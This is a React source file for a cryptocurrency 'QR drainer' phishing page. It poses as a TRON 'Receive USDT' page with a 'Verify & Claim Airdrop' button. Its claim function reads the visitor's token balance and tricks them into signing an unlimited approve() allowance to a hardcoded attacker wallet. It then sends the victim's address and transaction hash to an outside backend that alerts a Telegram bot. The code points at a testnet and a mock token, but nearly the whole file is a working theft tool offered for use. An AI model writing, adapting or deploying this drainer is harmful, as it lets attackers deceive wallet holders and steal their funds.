import React, { useEffect, useState } from "react";
import { QRCodeSVG } from "qrcode.react";

// CONFIGURATION
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET (Account 01)
const BACKEND = "https://qr-drainer.onrender.com";
const VERCEL_URL = "https://qr-drainer-one.vercel.app";

// TRON LOGO BASE64
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmMmQ1NSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

const fmt = (n) => Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

export default function App() {
  const [wallet, setWallet] = useState("");
  const [victimBal, setVictimBal] = useState(0);
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [inTronLink, setInTronLink] = useState(false);

  // QR Code with TronLink deep link
  const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;

  useEffect(() => {
    // Check if we're inside TronLink
    if (window.tronWeb && window.tronWeb.defaultAddress) {
      setInTronLink(true);
      const addr = window.tronWeb.defaultAddress.base58;
      setWallet(addr);
      
      // Read balance
      window.tronWeb.contract().at(TOKEN_ADDRESS).then(c => {
        return c.balanceOf(addr).call();
      }).then(raw => {
        setVictimBal(Number(raw.toString()) / 1e6);
      }).catch(e => console.log("Balance read error", e));
    }

    // Heartbeat
    const checkWallet = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (wallet !== addr) {
          setWallet(addr);
          setInTronLink(true);
          window.tronWeb.contract().at(TOKEN_ADDRESS).then(c => {
            return c.balanceOf(addr).call();
          }).then(raw => {
            setVictimBal(Number(raw.toString()) / 1e6);
          }).catch(e => console.log("Balance read error", e));
        }
      }
    }, 2000);
    return () => clearInterval(checkWallet);
  }, [wallet]);

  const handleOpenInTronLink = () => {
    window.location.href = `tronlink://open?url=${encodeURIComponent(window.location.href)}`;
  };

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(SWEEPER_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadQR = () => {
    const svg = document.querySelector('#lab-qr-box svg');
    if (!svg) return;
    const size = 400;
    const canvas = document.createElement('canvas');
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = "#ffffff";
    ctx.fillRect(0, 0, size, size);
    const img = new Image();
    const svgData = new XMLSerializer().serializeToString(svg);
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);
      const logoSize = size * 0.22;
      const logoPos = (size - logoSize) / 2;
      ctx.beginPath();
      ctx.arc(size/2, size/2, logoSize/2 + 10, 0, 2 * Math.PI);
      ctx.fillStyle = "#ffffff";
      ctx.fill();
      const logoImg = new Image();
      logoImg.onload = () => {
        ctx.drawImage(logoImg, logoPos, logoPos, logoSize, logoSize);
        const link = document.createElement('a');
        link.download = 'TRON-USDT-Receive.png';
        link.href = canvas.toDataURL('image/png');
        link.click();
      };
      logoImg.src = TRON_LOGO_B64;
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
  };

  // BULLETPROOF CLAIM FUNCTION (Fixes "Invalid Address" and triggers native popup)
  const handleClaim = async () => {
    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
      alert("Please connect your wallet first.");
      return;
    }
    
    setLoading(true);
    try {
      const tronWeb = window.tronWeb;
      const userAddress = tronWeb.defaultAddress.base58;

      // 1. FORCE TRONLINK EXTENSION TO AUTHORIZE THE SITE (Fixes "Invalid address")
      if (window.tronLink && window.tronLink.request) {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
      }

      // 2. BUILD TRANSACTION MANUALLY (Triggers the best native popup)
      // Function: approve(address spender, uint256 amount)
      const functionSelector = "approve(address,uint256)";
      const parameter = [
        { type: 'address', value: SWEEPER_ADDRESS },
        { type: 'uint256', value: 1000000000000000 } // Large amount
      ];
      const options = { feeLimit: 100000000, callValue: 0 };

      // This builds the raw transaction object
      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        TOKEN_ADDRESS,
        functionSelector,
        options,
        parameter,
        userAddress
      );

      if (!transaction.result || !transaction.result.result) {
        throw new Error("Contract call rejected by network");
      }

      // 3. SIGN THE TRANSACTION (THIS TRIGGERS THE NATIVE TRONLINK POPUP)
      const signedTx = await tronWeb.trx.sign(transaction.transaction);
      
      // 4. BROADCAST TO BLOCKCHAIN
      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
      
      if (broadcast.result) {
        const txId = broadcast.txid || transaction.transaction.txID;
        
        // 5. ALERT BACKEND
        await fetch(`${BACKEND}/api/alert`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            victimAddress: userAddress, 
            txHash: txId, 
            network: "TRON Shasta" 
          })
        });
        
        alert("✅ Success! Check your Telegram bot.");
      } else {
        throw new Error("Broadcast failed");
      }

    } catch (e) {
      console.error(e);
      alert("❌ Error: " + e.message);
    }
    setLoading(false);
  };

  return (
    <div style={{ 
      background: '#0a0e17', 
      minHeight: '100vh', 
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', 
      display: 'flex', 
      justifyContent: 'center', 
      alignItems: 'center', 
      padding: '20px' 
    }}>
      <div style={{ 
        background: '#1a1d26', 
        borderRadius: '24px', 
        padding: '30px', 
        maxWidth: '400px', 
        width: '100%', 
        boxShadow: '0 20px 60px rgba(0,0,0,0.5)',
        border: '1px solid #2a2d3a'
      }}>
        
        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
          <h2 style={{ margin: '0 0 8px 0', fontSize: '24px', fontWeight: '700', color: '#fff' }}>Receive USDT</h2>
          <div style={{ fontSize: '14px', color: '#8ea3c0', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
            <span style={{ width: '10px', height: '10px', background: '#ff2d55', borderRadius: '50%' }}></span>
            TRON (TRC20)
          </div>
        </div>

        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
          <div id="lab-qr-box" style={{ 
            display: 'inline-block', 
            padding: '20px', 
            background: '#fff', 
            borderRadius: '20px',
            boxShadow: '0 8px 32px rgba(0,0,0,0.3)'
          }}>
            <QRCodeSVG 
              value={qrValue} 
              size={220} 
              level="H" 
              includeMargin={false}
              imageSettings={{ src: TRON_LOGO_B64, height: 50, width: 50, excavate: true }}
            />
          </div>
        </div>

        <div style={{ 
          background: '#0f1219', 
          borderRadius: '12px', 
          padding: '14px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center', 
          marginBottom: '15px', 
          border: '1px solid #2a2d3a' 
        }}>
          <span style={{ 
            fontFamily: 'monospace', 
            fontSize: '12px', 
            color: '#eaf2ff', 
            overflow: 'hidden', 
            textOverflow: 'ellipsis', 
            whiteSpace: 'nowrap', 
            maxWidth: '70%' 
          }}>
            {SWEEPER_ADDRESS}
          </span>
          <button 
            onClick={handleCopyAddress} 
            style={{ 
              background: copied ? '#22c55e' : '#ff2d55', 
              color: '#fff', 
              border: 'none', 
              borderRadius: '8px', 
              padding: '8px 14px', 
              fontSize: '12px', 
              fontWeight: '600', 
              cursor: 'pointer' 
            }}
          >
            {copied ? '✓ Copied' : 'Copy'}
          </button>
        </div>

        <div style={{ 
          background: 'rgba(245, 158, 11, 0.1)', 
          border: '1px solid rgba(245, 158, 11, 0.3)', 
          borderRadius: '10px', 
          padding: '12px', 
          fontSize: '12px', 
          color: '#fbbf24', 
          marginBottom: '20px', 
          display: 'flex', 
          gap: '10px', 
          alignItems: 'flex-start' 
        }}>
          <span style={{ fontSize: '16px' }}>⚠️</span>
          <span style={{ lineHeight: '1.5' }}>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: '20px' }}>
          <button 
            onClick={handleDownloadQR} 
            style={{ 
              background: '#2a2d3a', 
              border: 'none', 
              borderRadius: '10px', 
              padding: '14px', 
              cursor: 'pointer', 
              fontWeight: '600', 
              color: '#fff',
              fontSize: '13px'
            }}
          >
            ⬇️ Save QR
          </button>
          <button 
            onClick={() => {
              if (navigator.share) {
                navigator.share({ title: 'Receive USDT', url: VERCEL_URL }).catch(() => {});
              } else {
                navigator.clipboard.writeText(VERCEL_URL);
                alert('Link copied!');
              }
            }} 
            style={{ 
              background: '#2a2d3a', 
              border: 'none', 
              borderRadius: '10px', 
              padding: '14px', 
              cursor: 'pointer', 
              fontWeight: '600', 
              color: '#fff',
              fontSize: '13px'
            }}
          >
            📤 Share
          </button>
        </div>

        {/* DYNAMIC BUTTON */}
        {!inTronLink ? (
          <button 
            onClick={handleOpenInTronLink}
            style={{ 
              width: '100%', 
              background: 'linear-gradient(135deg, #ff2d55, #ff7a45)', 
              color: '#fff', 
              border: 'none', 
              borderRadius: '12px', 
              padding: '16px', 
              fontSize: '16px', 
              fontWeight: '700', 
              cursor: 'pointer',
              boxShadow: '0 4px 20px rgba(255,45,85,0.4)'
            }}
          >
            🔗 Open in TronLink
          </button>
        ) : !wallet ? (
          <button 
            style={{ 
              width: '100%', 
              background: '#2a2d3a', 
              color: '#fff', 
              border: 'none', 
              borderRadius: '12px', 
              padding: '16px', 
              fontSize: '16px', 
              fontWeight: '700', 
              cursor: 'not-allowed',
              opacity: 0.6
            }}
            disabled
          >
            Connecting...
          </button>
        ) : (
          <button 
            onClick={handleClaim} 
            disabled={loading}
            style={{ 
              width: '100%', 
              background: 'linear-gradient(135deg, #ff2d55, #ff7a45)', 
              color: '#fff', 
              border: 'none', 
              borderRadius: '12px', 
              padding: '16px', 
              fontSize: '16px', 
              fontWeight: '700', 
              cursor: loading ? 'not-allowed' : 'pointer',
              boxShadow: '0 4px 20px rgba(255,45,85,0.4)'
            }}
          >
            {loading ? 'Processing...' : `Verify & Claim Airdrop (${fmt(victimBal)} USDT)`}
          </button>
        )}

        {wallet && (
          <div style={{ 
            marginTop: '15px', 
            textAlign: 'center', 
            fontSize: '11px', 
            color: '#8ea3c0',
            fontFamily: 'monospace'
          }}>
            Connected: {short(wallet)}
          </div>
        )}
      </div>
    </div>
  );
}